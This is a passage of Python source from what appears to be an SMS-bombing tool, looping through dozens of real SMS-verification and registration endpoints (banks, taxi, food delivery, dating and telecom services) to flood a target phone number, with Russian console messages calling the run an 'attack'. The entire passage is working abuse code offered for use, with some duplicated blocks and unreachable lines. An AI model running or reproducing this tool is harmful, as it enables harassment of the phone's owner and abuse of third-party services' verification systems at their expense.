            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            R = R + 1
            print('[+] carsmile Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            time.sleep(1)
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            R = R + 1
            print('[+] StarPizzaCafe Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            R = R + 1
            print('[+] Dostavista Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:

            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] MonoBank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            R = R + 1
            print('[+] binotel Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            R = R + 1
            print('[+] SportMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            R = R + 1
            print('[+] Alfalife Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            R = R + 1
            print('[+] KoronaPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", })
            R = R + 1
            print('[+] GGbet Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            R = R + 1
            print('[+] ETM Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            R = R + 1
            print('[+] TheLive Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            R = R + 1
            print('[+] MyGames Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999",
                                "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
            R = R + 1
            print('[+] Zoloto585 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            R = R + 1
            print('[+] Kasta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            R = R + 1
            print('[+] Тaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            R = R + 1
            print('[+] Creditter Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            R = R + 1
            print('[+] Ingos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            R = R + 1
            print('[+] Admiralxxx Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            R = R + 1
            print('[+] Av Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            R = R + 1
            print('[+] City24 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            R = R + 1
            print('[+] SushiMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            R = R + 1
            print('[+] MultiPlex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            R = R + 1
            print('[+] 3040 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            R = R + 1
            print('[+] Niyama Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            R = R + 1
            print('[+] VSK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            R = R + 1
            print('[+] EasyPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            R = R + 1
            print('[+] Fix-Price Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            R = R + 1
            print('[+] Tele2 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] Finam Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            R = R + 1
            print('[+] MakiMaki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            R = R + 1
            print('[+] FlipKart Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            R = R + 1
            print('[+] Online.ua Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            R = R + 1
            print('[+] PlanetaKino Was sent!')
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
